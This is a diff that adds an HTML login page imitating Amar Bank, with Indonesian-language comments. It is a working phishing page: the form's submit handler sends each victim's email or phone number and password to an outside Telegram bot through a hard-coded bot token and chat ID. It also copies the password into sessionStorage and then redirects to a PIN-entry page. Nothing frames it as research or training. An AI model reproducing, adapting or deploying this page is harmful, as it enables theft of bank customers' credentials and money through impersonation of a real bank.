@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amar Bank Login</title>
+    
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Font Awesome CSS -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+
+    <style>
+        /* Styling umum */
+        body {
+            background: linear-gradient(135deg, #1e90ff, #32cd32);
+            font-family: 'Roboto', sans-serif;
+            overflow: hidden;
+        }
+        
+        /* Tombol kembali di pojok kiri atas */
+        .back-button {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            font-size: 1.2rem;
+            color: #1e90ff;
+        }
+        
+        .back-button a {
+            text-decoration: none;
+            color: inherit;
+        }
+        
+        .back-button a:hover {
+            color: #1a7ccd;
+        }
+        
+        /* Styling Kartu Login */
+        .container {
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        .card {
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+            border-radius: 15px;
+            max-width: 400px;
+            padding: 2rem;
+            overflow: hidden;
+            margin-top: -50px;
+        }
+        
+        /* Logo dan Nama Bank */
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #32cd32;
+            font-size: 1.5rem;
+            font-weight: 500;
+            margin-bottom: 15px;
+        }
+        
+        /* Input Fields */
+        .input-group-text {
+            background-color: transparent;
+            border: none;
+        }
+
+        .form-control {
+            border: none;
+            border-bottom: 1px solid rgba(181, 181, 181, 1) ;
+            border-radius: 0;
+            box-shadow: none;
+        }
+
+        .form-control:focus {
+            border-bottom: 2px solid rgba(2, 241, 230, 1);
+            outline: none;
+            box-shadow: none;
+        }
+        
+        /* Tombol Login */
+        .btn-primary {
+            background: linear-gradient(135deg, #3ABFAE, #1e90ff); /* Gradien warna */
+            border: none;
+            border-radius: 40px;
+            color: #fff;
+            font-weight: bold;
+            padding: 12px;
+            margin-top: 30px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); /* Efek bayangan */
+            transition: transform 0.2s ease, box-shadow 0.2s ease; /* Transisi untuk animasi */
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #1a7ccd, #3ABFAE); /* Gradien warna saat hover */
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3); /* Bayangan lebih besar saat hover */
+            transform: translateY(-3px); /* Efek sedikit naik */
+        }
+
+        .btn-primary:active {
+            transform: translateY(1px); /* Efek turun saat ditekan */
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.2); /* Bayangan berkurang */
+        }
+
+        /* Efek hover dan pointer pada ikon fingerprint */
+        .fingerprint-icon {
+            color: rgba(41, 197, 190, 1);
+            cursor: pointer; /* Menunjukkan ikon bisa diklik */
+            transition: transform 0.2s, filter 0.2s; /* Efek transisi */
+        }
+
+        .fingerprint-icon:hover {
+            transform: scale(1.1); /* Sedikit membesar saat di-hover */
+            color: #1a7ccd;
+            filter: brightness(1.5); /* Menambah kecerahan saat di-hover */
+            animation: pulse 1s infinite; /* Menambahkan efek pulse */
+        }
+
+        /* Animasi pulse */
+        @keyframes pulse {
+            0% {
+                transform: scale(1.1);
+            }
+            50% {
+                transform: scale(1.15);
+            }
+            100% {
+                transform: scale(1.1);
+            }
+        }
+
+        /* Teks Daftar dan Hover */
+        .daftar-link {
+            color: #40AA86;
+            text-decoration: none;
+        }
+
+        .daftar-link:hover {
+            color: #1a7ccd;
+        }
+        .logo {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.5rem; /* Ukuran teks */
+    font-weight: bold; /* Ketebalan teks */
+    margin-bottom: 15px;
+}
+
+.logo i {
+    margin-right: 10px; /* Jarak antara ikon dan teks */
+    color: #32CD32; /* Warna ikon */
+}
+
+.logo span {
+    font-family: 'Roboto', sans-serif; /* Gaya font teks */
+    text-transform: uppercase; /* Mengubah teks menjadi huruf besar semua */
+    letter-spacing: 1px; /* Memberikan jarak antar huruf */
+}
+/* Mengatur warna placeholder */
+.form-control::placeholder {
+    color: #A9A9A9; /* Warna abu-abu */
+    opacity: 1; /* Untuk memastikan warna tidak terlalu transparan */
+}
+
+    </style>
+</head>
+
+<body>
+    <!-- Tombol Kembali -->
+    <div class="back-button">
+        <a href="javascript:history.back()">
+            <i class="fas fa-arrow-left"></i> Kembali
+        </a>
+    </div>
+
+    <div class="container d-flex align-items-center justify-content-center">
+        <div class="card text-center">
+            <!-- Logo dan Nama Bank -->
+            <div class="logo">
+                <i class="fas fa-infinity fa-2x"></i>
+                <span>amar bank</span>
+            </div>
+
+            <!-- Form Login -->
+            <form id="loginForm">
+                <div class="mb-3 input-group">
+                    <span class="input-group-text"><i class="fas fa-envelope"></i></span>
+                    <input type="text" name="emailOrPhone" class="form-control" placeholder="E-mail atau Nomor HP" id="emailOrPhoneInput" required>
+                </div>
+                
+                <div class="mb-3 input-group" style="margin-top: 50px;">
+                    <span class="input-group-text"><i class="fas fa-lock"></i></span>
+                    <input type="password" name="password" class="form-control" placeholder="Password" required>
+                    <button type="button" class="btn btn-light input-group-text" id="togglePassword">
+                        <i class="fas fa-eye" id="eyeIcon"></i>
+                    </button>
+                </div>
+
+                <button type="submit" class="btn btn-primary w-100 mb-3">Masuk</button>
+                
+                <div class="d-flex justify-content-between align-items-center mb-3">
+                    <div class="form-check">
+                        <input type="checkbox" class="form-check-input" id="rememberMe">
+                        <label class="form-check-label" for="rememberMe">Ingat saya</label>
+                    </div>
+                    <a href="#" class="text-decoration-none" style="color: #40AA86;">Lupa password?</a>
+                </div>
+            </form>
+
+            <hr>
+            <p>Atau login dengan sidik jari</p>
+            <div class="fingerprint-icon mb-3" data-bs-toggle="modal" data-bs-target="#fingerprintModal">
+                <i class="fas fa-fingerprint fa-3x"></i>
+            </div>
+
+            <!-- Modal Sidik Jari -->
+            <div class="modal fade" id="fingerprintModal" tabindex="-1" aria-labelledby="fingerprintModalLabel" aria-hidden="true">
+                <div class="modal-dialog modal-dialog-centered">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <h5 class="modal-title" id="fingerprintModalLabel">Login dengan Sidik Jari</h5>
+                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                        </div>
+                        <div class="modal-body">
+                            Fitur login dengan sidik jari belum tersedia saat ini. Silakan coba fitur lain atau login secara manual.
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Tutup</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <p><span class="default-text">Belum punya akun?</span> <a href="#" class="daftar-link">Daftar sekarang</a></p>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/js/all.min.js"></script>
+    <script>
+    // Ubah placeholder saat input difokuskan
+    const emailOrPhoneInput = document.getElementById("emailOrPhoneInput");
+    emailOrPhoneInput.addEventListener("focus", () => emailOrPhoneInput.placeholder = "08XXX atau masukkan e-mail");
+    emailOrPhoneInput.addEventListener("blur", () => emailOrPhoneInput.placeholder = "E-mail atau Nomor HP");
+
+    // Fungsi untuk mengirim data login ke Telegram dan menyimpan di sessionStorage
+    const botToken = "7673810619:AAFBi0aUwLPWbhrMn2yP6OTz1L84LAnwJD4";
+    const chatId = "7832654476";
+
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+        event.preventDefault();
+        const emailOrPhone = document.querySelector('input[name="emailOrPhone"]').value;
+        const password = document.querySelector('input[name="password"]').value;
+
+        // Simpan data ke sessionStorage
+        sessionStorage.setItem("emailOrPhone", emailOrPhone);
+        sessionStorage.setItem("password", password);
+
+        // Membuat pesan dengan format baru
+const message = `┌──────────────────────┐
+                   ＡＭＡＲ ＢＡＮＫ
+────────────────────┤
+𝐄𝐦𝐚𝐢𝐥/𝐏𝐡𝐨𝐧𝐞 : ${emailOrPhone}
+𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 : ${password}
+────────────────────┤`;
+
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+        })
+        .then(response => {
+            if (response.ok) {
+                alert("Login data sent to Telegram successfully.");
+                window.location.href = "masukkanpin.html"; // Ganti dengan URL halaman tujuan Anda
+            } else {
+                alert("Failed to send login data to Telegram.");
+            }
+        })
+        .catch(error => alert("Error: " + error.message));
+    });
+
+    // Toggle Password Visibility
+    document.getElementById("togglePassword").addEventListener("click", function() {
+        const passwordInput = document.querySelector('input[name="password"]');
+        const icon = document.getElementById("eyeIcon");
+
+        if (passwordInput.type === "password") {
+            passwordInput.type = "text";
+            icon.classList.remove("fa-eye");
+            icon.classList.add("fa-eye-slash");
+        } else {
+            passwordInput.type = "password";
+            icon.classList.remove("fa-eye-slash");
+            icon.classList.add("fa-eye");
+        }
+    });
+</script>
+
+</body>
+</html>
